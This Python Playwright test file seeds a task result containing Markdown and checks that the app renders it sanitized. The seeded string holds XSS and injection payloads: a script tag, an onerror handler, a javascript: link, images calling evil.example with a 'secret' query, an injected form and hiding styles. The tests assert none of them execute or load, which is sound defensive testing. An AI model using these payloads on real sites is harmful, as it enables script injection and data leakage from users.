"""Visual/browser check (#89): task results render as sanitized Markdown.

A headless Chromium loads a seeded task whose latest result and run history are Markdown, one with a
doubled Unicode escape and a script injection, plus a failed run. It asserts formatted output,
that nothing executes, that errors stay plain, and that "Save as snippet" still sends the stored source.
Runs in its own CI job; skipped when Playwright is not installed.
"""

from __future__ import annotations

import base64
import os
import socket
import threading
import time
from datetime import datetime, timezone

import pytest

sync_api = pytest.importorskip("playwright.sync_api")

# Stored text, exactly as a task would have saved it. The raw string keeps the two backslashes.
LATEST = (
    "## Weekly summary\n\n"
    "- first item\n"
    "- **bold** item\n\n"
    "| a | b |\n|---|---|\n| 1 | 2 |\n\n"
    "Open [the docs](/docs/how-it-works) now. Cost \\\\u00b7 low. Path C:\\users\\me.\n\n"
    "```\ncode block\n```\n\n"
    '<script>window.__pwned = true;</script>\n<img src=x onerror="window.__pwned2 = true">\n'
    "[bad](javascript:window.__pwned3=true)\n\n"
    "![pixel](https://evil.example/pixel.png?d=secret)\n\n"
    '<img src="https://evil.example/raw.png">\n\n'
    '<form method="post" action="/tasks/1/run-now"><button>Go</button><input name="x"></form>\n\n'
    "<style>body { display: none }</style>\n\n"
    '<p id="task-result-src" style="position:fixed;top:0">fake source</p>\n\n'
    "![Q&A](https://evil.example/qa.png)\n\n"
    '<a href="/\\evil.example/page">backslash link</a>\n\n'
    '<ol start="3"><li>three</li><li>four</li></ol>\n\n'
    "| left | right |\n|:-----|------:|\n| 1 | 2 |\n"
)
OLDER = "### Older run\n\n1. one\n2. two\n"
ERROR = "Boom: **not markdown** <b>x</b>"


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = int(s.getsockname()[1])
    s.close()
    return port


@pytest.fixture(scope="module")
def live(tmp_path_factory):
    """A real uvicorn server with a seeded org/admin and one task holding Markdown runs and a failed run."""
    import uvicorn
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker

    d = tmp_path_factory.mktemp("taskmd")
    saved = {
        k: os.environ.get(k) for k in ("ANTHILL_DB", "ANTHILL_JWT_SECRET", "ANTHILL_ENCRYPTION_KEY")
    }
    os.environ["ANTHILL_DB"] = str(d / "a.db")
    os.environ["ANTHILL_JWT_SECRET"] = "browser-test-secret-0123456789abcdef"
    os.environ["ANTHILL_ENCRYPTION_KEY"] = base64.b64encode(b"0" * 32).decode()

    import anthill.web.app as app_mod
    from anthill.web import db
    from anthill.web.crypto import make_token
    from anthill.web.db import Organization, ScheduledTask, TaskRun, User

    eng = create_engine(f"sqlite:///{d / 'a.db'}", connect_args={"check_same_thread": False})
    db.create_tables(eng)
    app_mod._engine = eng
    app_mod._SessionFactory = sessionmaker(bind=eng, autoflush=False, autocommit=False)
    # App startup would pull an embedding model in the background; no test may run the real ollama. The
    # autouse stub in tests/conftest.py is function-scoped and is not active while this module fixture starts.
    mp = pytest.MonkeyPatch()
    mp.setattr(app_mod, "_maybe_pull_embedding_model", lambda: None)
    mp.setattr(app_mod, "_start_model_pull", lambda *a, **k: None)
    mp.setattr(app_mod, "_maybe_autopull_vision", lambda *a, **k: None)
    s = app_mod._SessionFactory()
    o = Organization(name="A", slug="a")
    s.add(o)
    s.flush()
    u = User(org_id=o.id, email="admin@a.com", role="admin", active=True)
    s.add(u)
    s.flush()
    t = ScheduledTask(
        org_id=o.id,
        created_by=u.id,
        title="Weekly",
        goal="Summarise the week",
        schedule="daily",
        status="pending",
        run_count=3,
        last_result=LATEST,
    )
    s.add(t)
    s.flush()
    now = datetime.now(timezone.utc)
    for result, status, error in ((LATEST, "ok", ""), (OLDER, "ok", ""), ("", "error", ERROR)):
        s.add(
            TaskRun(
                org_id=o.id,
                task_id=t.id,
                trigger="scheduled",
                status=status,
                result=result,
                error=error,
                finished_at=now,
            )
        )
    s.commit()
    token = make_token(u.id, o.id, "admin")
    task_id = t.id

    port = _free_port()
    server = uvicorn.Server(
        uvicorn.Config(app_mod.app, host="127.0.0.1", port=port, log_level="warning")
    )
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    for _ in range(200):
        if server.started:
            break
        time.sleep(0.05)
    assert server.started, "uvicorn did not start"

    yield f"http://127.0.0.1:{port}", token, task_id

    server.should_exit = True
    thread.join(timeout=5)
    mp.undo()
    for k, v in saved.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v


def _open(live, p):
    base, token, task_id = live
    browser = p.chromium.launch(channel="chrome" if os.environ.get("CI") else None)
    ctx = browser.new_context(service_workers="block")
    ctx.add_cookies([{"name": "session_token", "value": token, "url": base}])
    page = ctx.new_page()
    outside = []  # every request the page makes to a host other than the app's own
    page.on(
        "request",
        lambda r: (
            outside.append(r.url) if not r.url.startswith(("http://127.0.0.1", "data:")) else None
        ),
    )
    page.goto(f"{base}/tasks/{task_id}/result", wait_until="domcontentloaded")
    page.wait_for_selector("#task-result h2")  # rendered to HTML
    page.wait_for_load_state("networkidle")
    page.outside_requests = outside
    return browser, page


def test_latest_result_and_history_render_as_sanitized_markdown(live):
    with sync_api.sync_playwright() as p:
        browser, page = _open(live, p)
        try:
            latest = page.locator("#task-result")
            assert latest.locator("h2").inner_text().strip() == "Weekly summary"
            assert latest.locator("ul li").count() == 2
            assert latest.locator("strong").inner_text().strip() == "bold"
            assert latest.locator("table").first.locator("td").count() == 2
            assert latest.locator("pre code").inner_text().strip() == "code block"
            link = latest.locator('a[href="/docs/how-it-works"]')
            assert link.count() == 1
            assert link.get_attribute("target") == "_blank"
            assert "noopener" in link.get_attribute("rel")
            assert "**bold**" not in latest.inner_text()

            # History: the open (newest) entry and the older one are formatted too.
            hist = page.locator("details")
            assert hist.locator("h3", has_text="Older run").count() == 1
            assert (
                hist.filter(has=page.locator("h3", has_text="Older run")).locator("ol li").count()
                == 2
            )
        finally:
            browser.close()


def test_nothing_in_a_result_can_execute(live):
    with sync_api.sync_playwright() as p:
        browser, page = _open(live, p)
        try:
            assert page.locator("#task-result script").count() == 0
            assert page.locator("#task-result [onerror]").count() == 0
            bad = page.locator("#task-result a", has_text="bad")
            href = bad.get_attribute("href") if bad.count() else None
            assert not (href or "").lower().startswith("javascript:")
            if bad.count():
                bad.first.click()
            for flag in ("__pwned", "__pwned2", "__pwned3"):
                assert page.evaluate(f"window.{flag}") in (None, False)
        finally:
            browser.close()


def test_a_doubled_unicode_escape_is_shown_as_stored_and_not_decoded(live):
    with sync_api.sync_playwright() as p:
        browser, page = _open(live, p)
        try:
            text = page.locator("#task-result").inner_text()
            assert "\u00b7" not in text  # the middle dot: nothing decodes the escape
            assert "u00b7" in text  # shown as text (Markdown reads the doubled backslash as one)
            assert "C:\\users\\me" in text  # user-authored backslashes are untouched
        finally:
            browser.close()


def test_failed_run_stays_plain_and_is_marked_as_an_error(live):
    with sync_api.sync_playwright() as p:
        browser, page = _open(live, p)
        try:
            err = page.locator("details pre.task-error")
            assert err.count() == 1
            assert err.inner_text() == ERROR  # literal text: no bold, no <b> element
            assert err.locator("strong, b").count() == 0
            assert page.locator("details .badge-danger").count() == 1
        finally:
            browser.close()


def test_save_as_snippet_still_sends_the_stored_source(live):
    sent = {}

    def capture(route, request):
        sent["body"] = request.post_data or ""
        route.fulfill(status=200, content_type="application/json", body='{"rationale": "ok"}')

    with sync_api.sync_playwright() as p:
        browser, page = _open(live, p)
        try:
            page.route("**/snippets/save", capture)
            page.click("text=Save as snippet")
            page.wait_for_selector("#snip-status:has-text('Red line')")
            body = sent["body"]
            assert (
                "Weekly summary" in body and "**bold** item" in body
            )  # Markdown source, not HTML text
            assert "\\\\u00b7" in body  # the stored escape, exactly as stored
        finally:
            browser.close()


def test_a_result_cannot_load_remote_content_or_inject_controls_or_styles(live):
    with sync_api.sync_playwright() as p:
        browser, page = _open(live, p)
        try:
            latest = page.locator("#task-result")
            # Nothing was fetched from outside the app: no image, no stylesheet, no media.
            assert page.outside_requests == []
            # The Markdown image is a plain link to its target; the raw <img> is gone.
            assert latest.locator("img").count() == 0
            assert latest.locator('a[href^="https://evil.example/pixel.png"]').count() == 1
            # No form controls, no style element or attribute, no ids that could shadow page elements.
            for sel in ("form", "input", "button", "style", "[style]", "[id]", "[class]"):
                assert latest.locator(sel).count() == 0, sel
            assert page.evaluate("getComputedStyle(document.body).display") != "none"
            # The history entries get the same policy.
            assert (
                page.locator(
                    "[data-md] img, [data-md] form, [data-md] style, [data-md] [style], [data-md] [id]"
                ).count()
                == 0
            )
        finally:
            browser.close()


def test_alignment_and_list_start_survive_and_odd_links_and_alt_text_are_safe(live):
    with sync_api.sync_playwright() as p:
        browser, page = _open(live, p)
        try:
            latest = page.locator("#task-result")
            assert latest.locator('ol[start="3"]').count() == 1
            assert latest.locator('th[align="right"]').count() == 1
            # A "/\\host" link is not kept as a link, and alt text is escaped once ("Q&A").
            assert latest.locator('a[href*="evil.example/page"]').count() == 0
            assert (
                latest.locator('a[href^="https://evil.example/qa.png"]:has-text("Q&A")').count()
                == 1
            )
            assert page.outside_requests == []
        finally:
            browser.close()
